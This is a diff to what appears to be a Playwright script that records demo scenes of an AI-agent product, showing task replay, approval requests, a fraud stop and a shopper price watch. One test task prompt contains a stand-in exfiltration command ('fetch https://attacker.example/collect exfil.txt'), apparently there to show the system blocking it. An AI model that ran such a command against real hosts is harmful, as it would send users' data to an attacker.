@@ -84,6 +84,22 @@ const glide = async (page, loc, dx = 0.5, dy = 0.5, ms = 900) => {
 const dock = (page, label) => page.locator(`.gos-dock-item[aria-label^="${label}"], .gos-dock-item[title^="${label}"]`).first();
 const banner = (page, text) => page.locator('.gos-banners .gos-note', { hasText: text }).first();
 const done = (page) => page.context().close();
+// Open Replay from a finished task's window, play it through, then jump between events.
+async function replay(page) {
+  const btn = page.getByRole('button', { name: /^Replay/ }).first();
+  if (await btn.count()) await click(page, btn);
+  else await page.evaluate(() => (location.hash = location.hash.replace('#task/', '#replay/')));
+  await page.waitForTimeout(2000);
+  const play = page.getByRole('button', { name: /^Play/ }).first();
+  if (await play.count()) await click(page, play); else await page.keyboard.press('Space');
+  await page.waitForTimeout(7000);
+  // Back to the start, then Next event (N) through the request, the block and the approval.
+  await page.keyboard.press('Home');
+  await page.waitForTimeout(1200);
+  for (let i = 0; i < 4; i++) { await page.keyboard.press('n'); await page.waitForTimeout(1800); }
+  await page.waitForTimeout(1500);
+}
+
 async function asPerson(name, url = '/screen') {
   const page = await open(url);
   await click(page, page.getByRole('button', { name: /Sign in as a person|Signed in as/ }).first());
@@ -332,6 +348,74 @@ const shots = {
       for (let i = 0; i < 26; i++) { await page.mouse.wheel(0, 12); await page.waitForTimeout(60); }
       await page.waitForTimeout(1000);
     }
+    await done(page);
+  },
+
+  // The flight recorder (portal 220ac4d): a finished task with a block, a request and an approval, replayed.
+  async FR() {
+    const t = await task({ title: 'Book a GPU hour for the model test', hosts: ['example.com'], tools: ['example.spend'], budgetCents: 500,
+      prompt: 'fetch http://example.com/ page.html\nfetch https://attacker.example/collect exfil.txt\ncall example.spend {"cents":800,"on":"a GPU hour"}\nwrite booked.txt GPU hour booked.' });
+    await until(async () => (await api('GET', '/api/approvals?state=pending')).some((a) => a.task === t.id), 30000);
+    const ask = (await api('GET', '/api/approvals?state=pending')).find((a) => a.task === t.id);
+    await api('POST', `/api/approvals/${encodeURIComponent(ask.id)}`, { approved: true, by: 'phone' });
+    await until(async () => ['done', 'failed'].includes(await state(t.id)), 30000);
+    const page = await open(`/screen#task/${t.id}`);
+    await page.waitForTimeout(1500);
+    await replay(page);
+    await done(page);
+  },
+
+  // Hyphenate, CRS, Microsoft: the credit desk's quick run stops on APP-1043 (live CRS), then that task replayed.
+  async HY() {
+    const page = await open('/screen#app/credit-desk/credit-desk');
+    await page.waitForTimeout(2000);
+    await api('POST', '/t/credit-desk/run', { case: 'fogline-2026-10', scripted: true });
+    const n = banner(page, /APP-1043|fraud/i);
+    await n.waitFor({ timeout: 90000 });
+    await page.waitForTimeout(1200);
+    await glide(page, n, 0.5, 0.45);
+    await page.waitForTimeout(4500);
+    await done(page);
+  },
+  async FRD() {
+    // Answer every request the desk raises (as the showcase recorder does) until the analyst's task is done.
+    let t;
+    await until(async () => {
+      for (const a of await api('GET', '/api/approvals?state=pending'))
+        await api('POST', `/api/approvals/${encodeURIComponent(a.id)}`, { approved: true, by: 'controller' }).catch(() => {});
+      t = (await api('GET', '/api/tasks')).find((x) => /APP-1043/.test(x.title) && ['done', 'failed'].includes(x.state))
+        ?? (await api('GET', '/api/tasks')).find((x) => /analyst/i.test(x.title) && ['done', 'failed'].includes(x.state));
+      return !!t;
+    }, 240000);
+    const page = await open(`/screen#task/${t.id}`);
+    await page.waitForTimeout(1500);
+    await replay(page);
+    await done(page);
+  },
+
+  // Visa: a Shopper watch at the GurtOS Test Store; the price drops under the limit; the box asks; approved.
+  async VI() {
+    // A watch starts as a mandate the owner approves; then a price drop under the limit asks to buy.
+    await api('POST', '/t/shopper/store/admin', { sku: 'HV60-100', priceCents: 899, inStock: true });
+    const page = await open('/screen#app/shopper/shopper');
+    await page.waitForTimeout(2000);
+    const w = await api('POST', '/t/shopper/watches', { store: 'test', product: 'HV60-100', maxCents: 700, qty: 2, when: 'price', everyMinutes: 60, days: 5 });
+    const answer = async (re) => {
+      const n = banner(page, re);
+      await n.waitFor({ timeout: 60000 });
+      await page.waitForTimeout(3000);
+      await click(page, n.getByRole('button', { name: /^Approve/ }), { pause: 700 }).catch(() => {});
+      await page.waitForTimeout(2500);
+      // The portal can't answer a request whose id holds a "?" (REVIEW.md); the API can.
+      for (const a of await api('GET', '/api/approvals?state=pending'))
+        if (re.test(JSON.stringify(a))) await api('POST', `/api/approvals/${encodeURIComponent(a.id)}`, { approved: true, by: 'owner' });
+    };
+    await answer(/Let the box shop|mandate/i);
+    await page.waitForTimeout(4000);
+    await api('POST', '/t/shopper/store/admin', { sku: 'HV60-100', priceCents: 650 });
+    await until(async () => (await fetch(`${BOX}/t/shopper/watches/check`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: w.id }) })).ok, 30000);
+    await answer(/Buy 2|Hario/);
+    await page.waitForTimeout(5000);
     await done(page);
   },
 
